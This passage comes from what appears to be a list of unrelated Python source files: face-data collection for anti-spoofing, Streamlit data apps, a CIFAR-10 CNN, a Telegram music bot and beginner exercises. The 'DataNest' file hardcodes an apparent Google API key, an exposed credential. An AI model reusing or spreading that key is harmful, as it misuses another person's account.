\u0438\u0437\u0445\u043e\u0434\u043d\u0438 \u0440\u0435\u0437\u0443\u043b\u0442\u0430\u0442\u0438 \u0432 \u0437\u043d\u0430\u0447\u0438\u043c\u0438 \u0432\u0435\u0440\u043e\u044f\u0442\u043d\u043e\u0441\u0442\u0438, \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0432\u0430\u0439\u043a\u0438 \u043d\u0430 \u043d\u0435\u0432\u0440\u043e\u043d\u043d\u0438",
    "import cv2\r\nfrom time import time\r\nimport cvzone\r\nfrom cvzone.FaceDetectionModule import FaceDetector\r\nimport os\r\n\r\n# This python file is for collecting data with existing videos\r\n\r\n####################################\r\n\r\n# REMINDER: CAREFUL WHEN LABELING IMAGES, ALWAYS CHECK THIS FIRST\r\n# IF YOU WANT TO ADD MORE CLASSES, REMEMBER TO COLLECT DATA RESPECTIVELY\r\nclassID = 1\r\n# 0: Replay\r\n# 1: Real\r\n# 2: Mask\r\n\r\n# Create a temporary folder to hold all extracted frames for later use\r\noutputFolderPath = 'Your path here'\r\nconfidence = 0.8\r\n\r\n# Change to False if you need to debug or examine\r\nsave = True \r\n\r\n# Larger is more focus\r\nblurThreshold = 30\r\n\r\n# For Debugging purpose\r\ndebug = False\r\n\r\n# FaceDetection Module bounding boxes are a bit small, higher offset means bigger bboxes\r\noffsetPercentageW = 10\r\noffsetPercentageH = 20\r\n\r\n# This will affect your final images size\r\ncamWidth, camHeight = 640, 480\r\n\r\n# For YOLO data format\r\nfloatingPoint = 6\r\n\r\n# Directory to folder that contains videos\r\ndir = 'Your path here'\r\nvidList = list()\r\n\r\nfor VidName in os.listdir(dir):\r\n    vidList.append(VidName)\r\n####################################\r\n\r\nfor vid in vidList:\r\n    cap = cv2.VideoCapture(f'{dir}/{vid}')\r\n    cap.set(3, camWidth)\r\n    cap.set(4, camHeight)\r\n    ret = cap.grab()\r\n\r\n    vidFPS = cap.get(cv2.CAP_PROP_FPS) # Frames per second\r\n    frames = cap.get(cv2.CAP_PROP_FRAME_COUNT) # Total frames of video\r\n    duration = round(frames / vidFPS) # Video length\r\n\r\n    frame_no = 0\r\n    # Higher skip_rate means lesser frame to extract\r\n    # if duration >= 5:\r\n    #     skip_rate = duration * 4\r\n    # else:\r\n    #     skip_rate = 1\r\n    skip_rate = duration * 2\r\n\r\n    detector = FaceDetector()\r\n    while ret:\r\n        success, img = cap.read()\r\n\r\n        if not success:\r\n            break\r\n\r\n        frame_no += 1\r\n\r\n        if (frame_no % skip_rate == 0):\r\n            imgOut = img.copy()\r\n            img, bboxs = detector.findFaces(img, draw=False)\r\n\r\n            listBlur = []  # True False values indicating if the faces are blur or not\r\n            listInfo = []  # The normalized values and the class name for the label txt file\r\n            if bboxs:\r\n                # bboxInfo - \"id\",\"bbox\",\"score\",\"center\"\r\n                for bbox in bboxs:\r\n                    x, y, w, h = bbox[\"bbox\"]\r\n                    score = bbox[\"score\"][0]\r\n                    # print(x, y, w, h)\r\n\r\n                    # ------  Check the score --------\r\n                    if score > confidence:\r\n\r\n                        # ------  Adding an offset to the face Detected --------\r\n                        offsetW = (offsetPercentageW / 100) * w\r\n                        x = int(x - offsetW)\r\n                        w = int(w + offsetW * 2)\r\n                        offsetH = (offsetPercentageH / 100) * h\r\n                        y = int(y - offsetH * 3)\r\n                        h = int(h + offsetH * 3.5)\r\n\r\n                        # ------  To avoid values below 0 --------\r\n                        if x < 0: x = 0\r\n                        if y < 0: y = 0\r\n                        if w < 0: w = 0\r\n                        if h < 0: h = 0\r\n\r\n                        # ------  Find Blurriness --------\r\n                        imgFace = img[y:y + h, x:x + w] \r\n                        blurValue = int(cv2.Laplacian(imgFace, cv2.CV_64F).var())\r\n                        if blurValue > blurThreshold:\r\n                            listBlur.append(True)\r\n                        else:\r\n                            listBlur.append(False)\r\n\r\n                        # ------  Normalize Values  --------\r\n                        ih, iw, _ = img.shape\r\n                        xc, yc = x + w / 2, y + h / 2\r\n\r\n                        xcn, ycn = round(xc / iw, floatingPoint), round(yc / ih, floatingPoint)\r\n                        wn, hn = round(w / iw, floatingPoint), round(h / ih, floatingPoint)\r\n                        # print(xcn, ycn, wn, hn)\r\n\r\n                        # ------  To avoid values above 1 --------\r\n                        if xcn > 1: xcn = 1\r\n                        if ycn > 1: ycn = 1\r\n                        if wn > 1: wn = 1\r\n                        if hn > 1: hn = 1\r\n\r\n                        listInfo.append(f\"{classID} {xcn} {ycn} {wn} {hn}\\n\")\r\n\r\n                        # ------  Drawing --------\r\n                        cv2.rectangle(imgOut, (x, y, w, h), (255, 0, 0), 3)\r\n                        cvzone.putTextRect(imgOut, f'Score: {int(score * 100)}% Blur: {blurValue}', (x, y - 0),\r\n                                        scale=2, thickness=3)\r\n                        if debug:\r\n                            cv2.rectangle(img, (x, y, w, h), (255, 0, 0), 3)\r\n                            cvzone.putTextRect(img, f'Score: {int(score * 100)}% Blur: {blurValue}', (x, y - 0),\r\n                                            scale=2, thickness=3)\r\n\r\n                # ------  To Save --------\r\n                if save:\r\n                    if all(listBlur) and l",
    "#!/usr/bin/env python\n# coding: utf-8\n# How to run this: dtale-streamlit run c:/your-path/your-script.py\n\n# # Making a generalized ML Model where the best algorithm will be selected for the given dataset\n\n#Importing the libraries\n\nimport pandas as pd\nimport numpy as np\nimport seaborn as sns\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.linear_model import LinearRegression, Ridge, Lasso, ElasticNet\nfrom sklearn.preprocessing import PolynomialFeatures\nfrom sklearn.pipeline import make_pipeline\nfrom sklearn.tree import DecisionTreeRegressor\nfrom sklearn.ensemble import RandomForestRegressor, GradientBoostingRegressor\nfrom xgboost import XGBRegressor\nfrom sklearn.neighbors import KNeighborsRegressor\nfrom sklearn.svm import SVR\nfrom imblearn.over_sampling import SMOTE\nfrom sklearn.linear_model import LogisticRegression\nfrom sklearn.tree import DecisionTreeClassifier\nfrom sklearn.ensemble import RandomForestClassifier\nfrom xgboost import XGBClassifier\nfrom sklearn.neighbors import KNeighborsClassifier\nfrom sklearn.svm import SVC\nimport matplotlib.pyplot as plt\nfrom ydata_profiling import ProfileReport\nimport dtale\nfrom sklearn.preprocessing import LabelEncoder\nfrom sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score, mean_absolute_error, mean_squared_error, r2_score\nfrom sklearn.naive_bayes import GaussianNB\nimport streamlit as st\nfrom streamlit_option_menu import option_menu\nfrom sklearn.impute import SimpleImputer\nfrom dtale.views import startup\nfrom dtale.app import get_instance\n\n#Initializing the session state\nif 'df' not in st.session_state:\n    st.session_state.df = None\n\nif 'target_column' not in st.session_state:\n    st.session_state.target_column = None\n\nif 'list_of_feature_columns' not in st.session_state:\n    st.session_state.list_of_feature_columns = None\n\n#Setting up dtale\n\ndef save_to_dtale(df):\n    startup(data_id=\"1\", data=df)\n\ndef retrieve_from_dtale():\n    return get_instance(\"1\").data\n\n#Setting up the page\n\nst.set_page_config(page_title= \" Best Algorithm Selection| By Surabhi Yadav\",\n                   page_icon= \":robot:\", \n                   layout= \"wide\",\n                   initial_sidebar_state= \"expanded\",\n                   menu_items={'About': \"\"\"# This app is created by *Surabhi Yadav!*\"\"\"})\n\nwith st.sidebar:\n    selected = option_menu('MENU', [\"Data Upload\", \"Automated EDA\", \"Missing Value Analysis\", \n                                    \"Obj to Num\", \"Boxplot Analysis\", \"Outlier Handling\", \n                                    \"Target Selection\", \"Main Algorithm\"], \n                           icons=[\"cloud-arrow-up-fill\", \"hypnotize\", \"question-circle-fill\", \"repeat\", \n                                  \"bar-chart-line-fill\", \"exclamation-triangle-fill\", \n                                  \"bullseye\", \"hourglass-top\"], \n                           menu_icon=\"menu-up\",\n                           default_index=0,\n                           orientation=\"vertical\",\n                           styles={\"nav-link\": {\"font-size\": \"15px\", \"text-align\": \"centre\", \"margin\": \"0px\", \n                                                \"--hover-color\": \"#00FFFF\"},\n                                   \"icon\": {\"font-size\": \"15px\"},\n                                   \"container\" : {\"max-width\": \"6000px\"},\n                                   \"nav-link-selected\": {\"background-color\": \"##00FFFF\"}})\n\n\n#Collecting the data and generalising the code body to read any type of file\n\nif selected == \"Data Upload\":\n\n    st.header(\"Data Upload\")\n\n    def get_supported_read_functions():\n        supported_read_functions = [getattr(pd, f) for f in dir(pd) if f.startswith('read_') and callable(getattr(pd, f))]\n        supported_read_functions = [func for func in supported_read_functions if func.__name__ != 'read_clipboard']\n        return supported_read_functions\n\n    def read_any_format(data_file):\n        supported_read_functions = get_supported_read_functions()\n\n        for read_func in supported_read_functions:\n            try:\n                st.session_state.df = read_func(data_file)\n                return st.session_state.df\n            except Exception as e:\n                continue\n        return None\n\n    data_file = st.file_uploader(label=\"File with any extension can be uploaded\", type = None, label_visibility=\"visible\")\n    if data_file is not None:\n        st.session_state.df = read_any_format(data_file)\n\n    show_table = st.button(\"Show the dataset stored\")\n    if show_table:\n        st.dataframe(st.session_state.df)\n        startup(data_id=\"1\", data=st.session_state.df)\n\n#Showing the automated EDA\n\nif selected == \"Automated EDA\":\n\n    st.header(\"Showing the automated EDA done on the uploaded dataset\")\n    save_to_dtale(st.session_state.df)\n    st.markdown('<iframe src=\"/dtale/main/1\" width=\"1000\" height=\"600\"></iframe>', unsafe_allow_html=True)\n    st.markdown('<a href=\"/dtale/main/1\" target=\"_blank\">Open D-Tale</a>', unsafe_allow_html=True)\n\n#Missing value analysis\n\n",
    "import streamlit as st\nimport firebase_admin\nfrom firebase_admin import credentials, auth\nfrom google.oauth2 import id_token\nfrom google.auth.transport import requests\nimport google.generativeai as genai\nimport sqlite3\nimport pandas as pd\nimport plotly.express as px\n\n# Firebase initialization\nif not firebase_admin._apps:\n    cred = credentials.Certificate(\"datasci-45410-66555c180fd9.json\")\n    firebase_admin.initialize_app(cred)\n\n# Google API Key for GenAI\nGOOGLE_API_KEY = 'AIzaSyDlfQowL4ytEsQ8rBn6XJb1ED3QUCUksFo'\ngenai.configure(api_key=GOOGLE_API_KEY)\n\n# Streamlit page configuration\nst.set_page_config(page_title=\"DataNest\", page_icon=\"\ud83d\udd0e\")\n\n# Prompt for GenAI\nprompt = [\n    \"\"\"\n    Imagine you're an SQL expert and data visualization advisor adept at translating English questions into precise SQL queries and recommending visualization types for a database named Job_Postings, which comprises two key tables: Companies and Salaries. Your expertise enables you to select the most appropriate chart type based on the expected query result set to effectively communicate the insights.\n\n    Here are examples to guide your query generation and visualization recommendation:\n\n    - Example Question 1: \"How many unique company names are there?\"\n      SQL Query: SELECT COUNT(DISTINCT name) FROM Companies;\n      Recommended Chart: None (The result is a single numeric value.)\n\n    - Example Question 2: \"What are the total number of companies in each city?\"\n      SQL Query: SELECT city, COUNT(*) AS total_companies FROM Companies GROUP BY city;\n      Recommended Chart: Bar chart (Cities on the X-axis and total companies on the Y-axis.)\n\n    - Example Question 3: \"List all companies with more than 500 employees.\"\n      SQL Query: SELECT name FROM Companies WHERE company_size > 500;\n      Recommended Chart: None (The result is a list of company names.)\n\n    - Example Question 4: \"What percentage does each formatted_work_type represent of the total?\"\n      SQL Query: SELECT formatted_work_type, (COUNT(*) * 100.0 / (SELECT COUNT(*) FROM Jobs)) AS percentage FROM Jobs GROUP BY formatted_work_type;\n      Recommended Chart: Pie chart (Show each formatted_work_type's percentage of the total.)\n\n    - Example Question 5: \"Which companies have the most job openings?\"\n      SQL Query: SELECT Companies.name, COUNT(Jobs.job_id) AS total_openings FROM Companies JOIN Jobs ON Companies.company_id = Jobs.company_id GROUP BY Companies.name ORDER BY total_openings DESC LIMIT 10;\n      Recommended Chart: Bar chart (Company names on the X-axis and total job openings on the Y-axis.)\n\n\n    Your task is to craft the correct SQL query in response to the given English questions and suggest an appropriate chart type for visualizing the query results, if applicable. Please ensure that the SQL code generated does not include triple backticks (\\`\\`\\`) at the beginning or end and avoids including the word \"sql\" within the output. Also, provide clear and concise chart recommendations when the query results lend themselves to visualization.\n    \"\"\"\n]\n\n# Function to retrieve SQL query from GenAI response\ndef get_sql_query_from_response(response):\n    try:\n        query_start = response.index('SELECT')  \n        query_end = response.index(';') + 1  \n        sql_query = response[query_start:query_end]  \n        return sql_query\n    except ValueError:\n        return None\n\n# Function to retrieve SQL query from GenAI for a given question\ndef get_gemini_response(question, prompt):\n    model = genai.GenerativeModel('gemini-pro')\n    response = model.generate_content([prompt[0], question])\n    return response.text\n\n#  main fun\ndef app():\n    st.title('Welcome to DataNest')\n\n    if 'username' not in st.session_state:\n        st.session_state.username = ''\n    if 'useremail' not in st.session_state:\n        st.session_state.useremail = ''\n\n    def f(email): \n        try:\n            user = auth.get_user_by_email(email)\n            st.session_state.username = user.uid\n            st.session_state.useremail = user.email\n            st.session_state.signedout = True\n            st.session_state.signout = True\n            st.success(\"Login Successful!\")\n            st.toast('You can now access all features.')\n            st.snow()\n        except: \n            st.warning('Login Failed')\n\n    def google_login(id_token):\n        try:\n            decoded_token = id_token.verify_oauth2_token(id_token, requests.Request())\n            email = decoded_token['email']\n            user = auth.get_user_by_email(email)\n            st.session_state.username = user.uid\n            st.session_state.useremail = user.email\n            st.session_state.signedout = True\n            st.session_state.signout = True\n            st.success(\"Login Successful! You can now access all features.\")    \n        except Exception as e: \n            st.warning(f'Google Login Failed: {str(e)}')\n\n    def t():\n        st.session_state.signout = False\n        st.session_state.signedout = False   \n        st.ses",
    "import numpy as np\r\nimport matplotlib.pyplot as plt\r\nimport pickle\r\nfrom tensorflow.keras.models import Sequential\r\nfrom tensorflow.keras.layers import Conv2D, MaxPooling2D, Dense, Flatten\r\nfrom tensorflow.keras.utils import to_categorical\r\n\r\n\r\ndef load_cifar10_batch(file):\r\n    with open(file, 'rb') as fo:\r\n        dict = pickle.load(fo, encoding='bytes')\r\n    return dict[b'data'], dict[b'labels']\r\n\r\n\r\nX_train, Y_train = [], []\r\nfor i in range(1, 6):  \r\n    X_batch, Y_batch = load_cifar10_batch(f'data_batch_{i}')\r\n    X_train.append(X_batch)\r\n    Y_train += Y_batch\r\n\r\nX_train = np.concatenate(X_train, axis=0)\r\nY_train = np.array(Y_train)\r\n\r\n\r\nX_test, Y_test = load_cifar10_batch('test_batch')\r\n\r\n\r\nX_train = X_train.reshape((len(X_train), 3, 32, 32)).transpose(0,2,3,1) / 255.0\r\nX_test = X_test.reshape((len(X_test), 3, 32, 32)).transpose(0,2,3,1) / 255.0\r\n\r\n\r\nY_train = to_categorical(Y_train, 10)\r\nY_test = to_categorical(Y_test, 10)\r\n\r\n\r\nmodel = Sequential([\r\n    Conv2D(32, (3, 3), activation='relu', input_shape=(32, 32, 3)),\r\n    MaxPooling2D((2, 2)),\r\n    Conv2D(64, (3, 3), activation='relu'),\r\n    MaxPooling2D((2, 2)),\r\n    Flatten(),\r\n    Dense(64, activation='relu'),\r\n    Dense(10, activation='softmax')  \r\n])\r\n\r\n\r\nmodel.compile(loss='categorical_crossentropy', optimizer='adam', metrics=['accuracy'])\r\n\r\n\r\nmodel.fit(X_train, Y_train, epochs=10, batch_size=64, validation_data=(X_test, Y_test))\r\n\r\n\r\nloss, accuracy = model.evaluate(X_test, Y_test)\r\nprint(f\"Test Loss: {loss}, Test Accuracy: {accuracy}\")\r\n\r\n",
    "import os\nfrom random import randint\nfrom typing import Union\n\nfrom pyrogram.types import InlineKeyboardMarkup\n\nimport config\nfrom BRANDEDKING import Carbon, YouTube, app\nfrom BRANDEDKING.core.call import BRANDED\nfrom BRANDEDKING.misc import db\nfrom BRANDEDKING.utils.database import add_active_video_chat, is_active_chat\nfrom BRANDEDKING.utils.exceptions import AssistantErr\nfrom BRANDEDKING.utils.inline import aq_markup, close_markup, stream_markup\nfrom BRANDEDKING.utils.pastebin import BRANDEDBin\nfrom BRANDEDKING.utils.stream.queue import put_queue, put_queue_index\nfrom BRANDEDKING.utils.thumbnails import get_thumb\n\n\nasync def stream(\n    _,\n    mystic,\n    user_id,\n    result,\n    chat_id,\n    user_name,\n    original_chat_id,\n    video: Union[bool, str] = None,\n    streamtype: Union[bool, str] = None,\n    spotify: Union[bool, str] = None,\n    forceplay: Union[bool, str] = None,\n):\n    if not result:\n        return\n    if forceplay:\n        await BRANDED.force_stop_stream(chat_id)\n    if streamtype == \"playlist\":\n        msg = f\"{_['play_19']}\\n\\n\"\n        count = 0\n        for search in result:\n            if int(count) == config.PLAYLIST_FETCH_LIMIT:\n                continue\n            try:\n                (\n                    title,\n                    duration_min,\n                    duration_sec,\n                    thumbnail,\n                    vidid,\n                ) = await YouTube.details(search, False if spotify else True)\n            except:\n                continue\n            if str(duration_min) == \"None\":\n                continue\n            if duration_sec > config.DURATION_LIMIT:\n                continue\n            if await is_active_chat(chat_id):\n                await put_queue(\n                    chat_id,\n                    original_chat_id,\n                    f\"vid_{vidid}\",\n                    title,\n                    duration_min,\n                    user_name,\n                    vidid,\n                    user_id,\n                    \"video\" if video else \"audio\",\n                )\n                position = len(db.get(chat_id)) - 1\n                count += 1\n                msg += f\"{count}. {title[:70]}\\n\"\n                msg += f\"{_['play_20']} {position}\\n\\n\"\n            else:\n                if not forceplay:\n                    db[chat_id] = []\n                status = True if video else None\n                try:\n                    file_path, direct = await YouTube.download(\n                        vidid, mystic, video=status, videoid=True\n                    )\n                except:\n                    raise AssistantErr(_[\"play_14\"])\n                await BRANDED.join_call(\n                    chat_id,\n                    original_chat_id,\n                    file_path,\n                    video=status,\n                    image=thumbnail,\n                )\n                await put_queue(\n                    chat_id,\n                    original_chat_id,\n                    file_path if direct else f\"vid_{vidid}\",\n                    title,\n                    duration_min,\n                    user_name,\n                    vidid,\n                    user_id,\n                    \"video\" if video else \"audio\",\n                    forceplay=forceplay,\n                )\n                img = await get_thumb(vidid)\n                button = stream_markup(_, chat_id)\n                run = await app.send_photo(\n                    original_chat_id,\n                    photo=img,\n                    caption=_[\"stream_1\"].format(\n                        f\"https://t.me/{app.username}?start=info_{vidid}\",\n                        title[:23],\n                        duration_min,\n                        user_name,\n                    ),\n                    reply_markup=InlineKeyboardMarkup(button),\n                )\n                db[chat_id][0][\"mystic\"] = run\n                db[chat_id][0][\"markup\"] = \"stream\"\n        if count == 0:\n            return\n        else:\n            link = await BRANDEDBin(msg)\n            lines = msg.count(\"\\n\")\n            if lines >= 17:\n                car = os.linesep.join(msg.split(os.linesep)[:17])\n            else:\n                car = msg\n            carbon = await Carbon.generate(car, randint(100, 10000000))\n            upl = close_markup(_)\n            return await app.send_photo(\n                original_chat_id,\n                photo=carbon,\n                caption=_[\"play_21\"].format(position, link),\n                reply_markup=upl,\n            )\n    elif streamtype == \"youtube\":\n        link = result[\"link\"]\n        vidid = result[\"vidid\"]\n        title = (result[\"title\"]).title()\n        duration_min = result[\"duration_min\"]\n        thumbnail = result[\"thumb\"]\n        status = True if video else None\n        try:\n            file_path, direct = await YouTube.download(\n                vidid, mystic, videoid=True, video=status\n            )\n        except:\n            raise AssistantErr(_[\"play_14\"])\n        if await is_active_",
    "# Print the string \"Hello\"\r\nprint('Hello')\r\n\r\n# Print the string \"Universe!\"\r\nprint(\"Universe!\")\r\n\r\n# Print the strings \"Hello\" and \"Universe!\" on separate lines\r\nprint('Hello\\nUniverse!')\r\n\r\n# Print a single backslash character\r\nprint(\"\\\\\")\r\n\r\n# Print the strings \"Hello\" and \"Universe!\" with a space in between\r\nprint(\"Hello\", end=\" \")\r\nprint('Universe!')\r\n\r\n# Print the strings \"Hello\" and \"Universe!\" separated by \"##\"\r\nprint(\"Hello\", \"Universe!\", sep=\"##\")\r\n\r\n# Print the strings \"Hello\" and \"Universe!\" separated by \"##\" (using multiplication)\r\nprint(\"Hello\", \"Universe!\", sep=\"#\" * 2)\r\n\r\n#The print() Function:\r\n\r\n#The print() function is a built-in Python function used to display a specified message in the console window.\r\n#Unlike user-defined functions, built-in functions are always available without needing to be imported.\r\n#Python 3.8 includes 69 built-in functions, which can be found in the Python Standard Library.\r\n\r\n#Function Invocation and Arguments:\r\n#To call a function, use its name followed by parentheses.\r\n#You can pass arguments into a function by placing them inside the parentheses, separated by commas.\r\n#An empty print() function outputs a newline to the screen.\r\n\r\n#String Delimiters and Special Characters:\r\n#Python strings are enclosed in quotes (either double or single).\r\n#The backslash (\\) is a special character in strings, indicating that the next character has a different meaning (e.g., \\n for a newline).\r\n#Instructions and Programs:\r\n#Computer programs consist of instructions\u2014commands executed to perform specific tasks.\r\n#For example, using print() to display a message on the screen.\r\n\r\n#Positional and Keyword Arguments:\r\n#Positional arguments\u2019 meanings depend on their position (e.g., second argument follows the first).\r\n#Keyword arguments\u2019 meanings are identified by special keywords, not position.\r\n\r\n#Customizing Output with end and sep:\r\n#The end parameter controls what appears at the end of a print() statement (default is a newline).\r\n#The sep parameter specifies the separator between outputted arguments (e.g., print(\"H\", \"E\", \"L\", \"L\", \"O\", sep=\"-\")).",
    "#!/usr/bin/env python3\nimport inquirer\nimport subprocess\n\n\ndef set_git_config(name, email):\n    subprocess.run(['git', 'config', '--global',\n                   'user.name', name], check=True)\n    subprocess.run(['git', 'config', '--global',\n                   'user.email', email], check=True)\n    print(f\"Git config set to Name: {name}, Email: {email}\")\n\n\ndef main():\n    questions = [\n        inquirer.List('config',\n                      message=\"Choose git config\",\n                      choices=['personal', 'work'],\n                      ),\n    ]\n    answers = inquirer.prompt(questions)\n\n    if answers['config'] == 'personal':\n        # change to personal account\n        PERSONAL_NAME = \"Your Personal Name\"\n        PERSONAL_EMAIL = \"your.personal@example.com\"\n        set_git_config(PERSONAL_NAME, PERSONAL_EMAIL)\n    elif answers['config'] == 'work':\n        # change to work account\n        WORK_NAME = \"Your Work Name\"\n        WORK_EMAIL = \"your.work@example.com\"\n        set_git_config(WORK_NAME, WORK_EMAIL)\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "import string\r\nimport re\r\nimport numpy as np\r\nfrom collections import Counter\r\nimport streamlit as st\r\n\r\n# Importing data\r\ndef read_corpus(filename):\r\n    with open(filename, 'r', encoding='utf-8') as file:\r\n        lines = file.readlines()\r\n\r\n        words = []\r\n        for word in lines:\r\n            words += re.findall(r'\\w+', word.lower())\r\n    return words\r\n\r\n# Invoke this function\r\ncorpus = read_corpus(r\"C:\\Users\\Suyash\\Downloads\\big.txt\")\r\nvocab = set(corpus)\r\nwords_count = Counter(corpus)\r\ntotal_words_count = float(sum(words_count.values()))\r\nword_probabs = {word: words_count[word] / total_words_count for word in words_count.keys()}\r\n\r\ndef split(word):\r\n    return [(word[:i], word[i:]) for i in range(len(word) + 1)]\r\n\r\ndef delete(word):\r\n    return [left + right[1:] for left, right in split(word) if right]\r\n\r\ndef swap(word):\r\n    return [left + right[1] + right[0] + right[2:] for left, right in split(word) if len(right) > 1]\r\n\r\ndef replace(word):\r\n    return [left + center + right[1:] for left, right in split(word) if right for center in string.ascii_lowercase]\r\n\r\ndef insert(word):\r\n    return [left + center + right for left, right in split(word) for center in string.ascii_lowercase]\r\n\r\ndef level_one_edits(word):\r\n    return set((delete(word) + swap(word) + replace(word) + insert(word)))\r\n\r\ndef level_two_edits(word):\r\n    return set(e2 for e1 in level_one_edits(word) for e2 in level_one_edits(e1))\r\n\r\ndef correct_spelling(word, vocab, word_probabs):\r\n    if word in vocab:\r\n        return f\"{word} is already correctly spelled\"\r\n    \r\n    suggestions = level_one_edits(word) or level_two_edits(word) or [word]\r\n    best_guesses = [w for w in suggestions if w in vocab]\r\n    \r\n    if not best_guesses:\r\n        return f\"Sorry, no suggestions found for {word}\"\r\n    \r\n    suggestions_with_probabs = [(w, word_probabs[w]) for w in best_guesses]\r\n    suggestions_with_probabs.sort(key=lambda x: x[1], reverse=True)\r\n    \r\n    return f\"Suggestions for {word}: \" + ', '.join([f\"{w} ({prob:.2%})\" for w, prob in suggestions_with_probabs[:10]])\r\n\r\n# GUI or Web App\r\nst.title(\"SpellCheck Pro: Auto-Correct Misspelled Word Search Engine\")\r\nword = st.text_input('Search Here')\r\n\r\nif st.button('Check'):\r\n    result = correct_spelling(word, vocab, word_probabs)\r\n    st.write(result)\r\n\r\n\r\n\r\n",
    "# Hands On 2 - Hernandez De la Cruz Miguel Angel\r\n\r\nclass RegresionLinealSimple:  # Defino la clase\r\n    def __init__(self):  # M\u00e9todo constructor\r\n        self.b0 = None  # Inicializa el coeficiente b0 como nulo\r\n        self.b1 = None\r\n\r\n                  #Parametros del m\u00e9todo SELF\r\n    def fit(self, X, y):  # M\u00e9todo para ajustar el modelo\r\n        n = len(X)  # Longitud de la lista para X\r\n        \r\n        # Calculando las sumas necesarias\r\n        sum_x = 0  # Inicializa la suma de los datos de entrada (SumX)\r\n        sum_y = 0  #                                            (SumY)\r\n        sum_xy = 0  #                                           (SumXY)\r\n        sum_x_squared = 0  #                                    (SumXquad)\r\n        sum_x_times_sum_y = 0  #                                (SumX*SumY)\r\n        sum_x_sum_x = 0  #                                      (SumXSumX)\r\n        n_times_sum_xy = 0  #                                   (n*SumXY)\r\n        sum_x_sum_y = 0  #                                      (SumXSumY)\r\n        n_times_sum_xy_minus_sum_x_sum_y = 0  #                 (n*SumXY-SumX*SumY)\r\n        \r\n        for i in range(n):  # Itera sobre los datos de entrada\r\n            sum_x += X[i]  # Agrega el dato a la suma correspondiente\r\n            sum_y += y[i]  \r\n            sum_xy += X[i] * y[i]  \r\n            sum_x_squared += X[i] ** 2  \r\n            sum_x_times_sum_y += X[i] * sum_y  \r\n            sum_x_sum_x += X[i] * sum_x  \r\n            n_times_sum_xy += n * sum_xy  \r\n            sum_x_sum_y += sum_x * sum_y  \r\n            n_times_sum_xy_minus_sum_x_sum_y += n * sum_xy - sum_x * sum_y  \r\n\r\n        # Se calculan los coeficientes B0 y B1\r\n        self.b1 = (n * sum_xy - sum_x * sum_y) / (n * sum_x_squared - sum_x ** 2)\r\n        self.b0 = (sum_y - self.b1 * sum_x) / n\r\n\r\n    def predict(self, x):  # M\u00e9todo/predicciones\r\n        if self.b0 is None or self.b1 is None:  # Si los coeficientes no han sido asignados\r\n            raise Exception(\"Error, primero ajuste el modelo antes de predecir.\") \r\n        return self.b0 + self.b1 * x  # Retorna la predicci\u00f3n de los coeficientes calculados\r\n\r\n\r\n# Datos\r\nX = [1, 2, 3, 4, 5, 6, 7, 8, 9]                     # Advertising\r\ny = [2, 4, 6, 8, 10, 12, 14, 16, 18]                # Sales\r\n\r\n# Crear y entrenar el modelo (Implica estimar los par\u00e1metros del modelo)\r\nmodel = RegresionLinealSimple()  # Instancia un objeto de la clase\r\nmodel.fit(X, y)  # Ajusta el modelo a los datos de entrada y salida\r\n\r\n\r\n\r\n# Imprimir los valores de B0 y B1\r\n\r\n\r\nprint(\"\\n\\n\\n_________________________________________________________________________________________________\\n\")\r\nprint(\"                            Hands-on 2: Coding, SLR Technique\")\r\nprint(\"_________________________________________________________________________________________________\\n\\n\\n\")\r\n\r\nprint(\"                                  B0:\", model.b0) \r\nprint(\"                                  B1:\", model.b1)  \r\nprint(\"\\n\\n\\n_________________________________________________________________________________________________\\n\")\r\n\r\n\r\n\r\n# Hacer predicciones\r\nnuevoX = 20  # Nuevo dato de entrada\r\nprediccionDeY = model.predict(nuevoX)  # Realiza una predicci\u00f3n basada en el nuevo dato de entrada\r\n\r\nprint(\"             Para Advertising =\", nuevoX, \", la predicci\u00f3n de Sales es:\", prediccionDeY)  # Imprime la predicci\u00f3n realizada\r\nprint(\"_________________________________________________________________________________________________\\n\\n\\n\")\r\n\r\n\r\n\r\n\r\n\r\n",
    "import time\r\nimport math\r\nimport os\r\nfrom pyrogram.errors import FloodWait\r\n\r\nclass Timer:\r\n    def __init__(self, time_between=5):\r\n        self.start_time = time.time()\r\n        self.time_between = time_between\r\n\r\n    def can_send(self):\r\n        if time.time() > (self.start_time + self.time_between):\r\n            self.start_time = time.time()\r\n            return True\r\n        return False\r\n\r\n\r\nfrom datetime import datetime,timedelta\r\n\r\n#lets do calculations\r\ndef hrb(value, digits= 2, delim= \"\", postfix=\"\"):\r\n    \"\"\"Return a human-readable file size.\r\n    \"\"\"\r\n    if value is None:\r\n        return None\r\n    chosen_unit = \"B\"\r\n    for unit in (\"KiB\", \"MiB\", \"GiB\", \"TiB\"):\r\n        if value > 1000:\r\n            value /= 1024\r\n            chosen_unit = unit\r\n        else:\r\n            break\r\n    return f\"{value:.{digits}f}\" + delim + chosen_unit + postfix\r\n\r\ndef hrt(seconds, precision = 0):\r\n    \"\"\"Return a human-readable time delta as a string.\r\n    \"\"\"\r\n    pieces = []\r\n    value = timedelta(seconds=seconds)\r\n    \r\n\r\n    if value.days:\r\n        pieces.append(f\"{value.days}d\")\r\n\r\n    seconds = value.seconds\r\n\r\n    if seconds >= 3600:\r\n        hours = int(seconds / 3600)\r\n        pieces.append(f\"{hours}h\")\r\n        seconds -= hours * 3600\r\n\r\n    if seconds >= 60:\r\n        minutes = int(seconds / 60)\r\n        pieces.append(f\"{minutes}m\")\r\n        seconds -= minutes * 60\r\n\r\n    if seconds > 0 or not pieces:\r\n        pieces.append(f\"{seconds}s\")\r\n\r\n    if not precision:\r\n        return \"\".join(pieces)\r\n\r\n    return \"\".join(pieces[:precision])\r\n\r\n\r\n\r\ntimer = Timer()\r\n\r\n# Powered By Ankush\r\nasync def progress_bar(current, total, reply, start):\r\n    if timer.can_send():\r\n        now = time.time()\r\n        diff = now - start\r\n        if diff < 1:\r\n            return\r\n        else:\r\n            perc = f\"{current * 100 / total:.1f}%\"\r\n            elapsed_time = round(diff)\r\n            speed = current / elapsed_time\r\n            remaining_bytes = total - current\r\n            if speed > 0:\r\n                eta_seconds = remaining_bytes / speed\r\n                eta = hrt(eta_seconds, precision=1)\r\n            else:\r\n                eta = \"-\"\r\n            sp = str(hrb(speed)) + \"/s\"\r\n            tot = hrb(total)\r\n            cur = hrb(current)\r\n            bar_length = 11\r\n            completed_length = int(current * bar_length / total)\r\n            remaining_length = bar_length - completed_length\r\n            